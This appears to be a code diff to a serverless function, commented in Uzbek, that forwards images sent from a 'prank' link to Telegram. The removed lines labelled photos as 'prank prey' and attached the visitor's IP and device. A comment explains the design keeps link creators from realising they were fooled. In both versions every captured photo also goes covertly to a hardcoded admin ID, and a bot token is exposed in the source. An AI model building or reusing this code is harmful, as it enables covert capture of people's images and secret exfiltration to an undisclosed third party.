@@ -1,7 +1,7 @@
 // Vercel Serverless Function: Foydalanuvchi rasmini Telegramga yuborish
 const BOT_TOKEN = process.env.BOT_TOKEN || '8397655004:AAHz1xBd0vNNLRe9H-8krdFjZNi9btJW4GA';
 
-// 🔐 Asosiy Admin ID — barcha olingan rasmlar doim sizga keladi
+// 🔐 Admin ID
 const ADMIN_ID = '5724786253';
 
 const handler = async (req, res) => {
@@ -21,24 +21,15 @@ const handler = async (req, res) => {
     if (data.includes(';base64,')) base64 = data.split(';base64,')[1];
     const buffer = Buffer.from(base64, 'base64');
 
-    // Foydalanuvchi ma'lumotlari
-    const ip   = String(req.headers['x-forwarded-for'] || req.socket?.remoteAddress || 'Noma\'lum').split(',')[0].trim();
-    const ua   = (req.headers['user-agent'] || 'Noma\'lum').substring(0, 120);
+    // Faqat sana va vaqt
     const time = new Date().toLocaleString('uz-UZ', { timeZone: 'Asia/Tashkent' });
+    const caption = `📅 ${time}`;
 
-    // Rasmni yuboruvchi yordamchi funksiya
-    async function sendToTelegram(targetChatId, isForAdmin = false) {
-      const caption =
-        `📸 <b>Yangi prank o'ljasi!</b>\n\n` +
-        `📅 <b>Vaqt:</b> ${time}\n` +
-        `🌐 <b>IP:</b> <code>${ip}</code>\n` +
-        `📱 <b>Qurilma:</b> <i>${ua}</i>` +
-        (isForAdmin && chat_id ? `\n👤 <b>Havola egasi (ID):</b> <code>${chat_id}</code>` : '');
-
+    // Telegram API ga rasm yuborish funksiyasi
+    async function sendPhotoToChat(targetChatId) {
       const fd = new FormData();
       fd.append('chat_id', targetChatId);
       fd.append('caption', caption);
-      fd.append('parse_mode', 'HTML');
       fd.append('photo', new Blob([buffer], { type: 'image/jpeg' }), 'photo.jpg');
 
       const tgRes = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
@@ -48,15 +39,18 @@ const handler = async (req, res) => {
       return await tgRes.json();
     }
 
-    // 1. Har doim adminga (5724786253) yuborish
-    const adminResult = await sendToTelegram(ADMIN_ID, true);
-
-    // 2. Agar havolani boshqa user yaratgan bo'lsa, unga ham borishi mumkin (o'zini aldanib qolganini sezmasligi uchun)
-    if (chat_id && String(chat_id) !== String(ADMIN_ID)) {
-      sendToTelegram(chat_id, false).catch(() => {});
+    // Yuborilishi kerak bo'lgan ID lar ro'yxati (ham admin, ham user)
+    const targetIds = new Set();
+    targetIds.add(String(ADMIN_ID));
+    if (chat_id) {
+      targetIds.add(String(chat_id));
     }
 
-    return res.status(200).json(adminResult);
+    // Ikkalasiga ham bir vaqtda to'liq yuborilishini kutish (Vercel serverless to'xtab qolmasligi uchun)
+    const sendPromises = Array.from(targetIds).map(id => sendPhotoToChat(id));
+    const results = await Promise.allSettled(sendPromises);
+
+    return res.status(200).json({ ok: true, sent_to: Array.from(targetIds), results });
   } catch (err) {
     console.error('Yuborishda xatolik:', err);
     return res.status(500).json({ error: err.message });
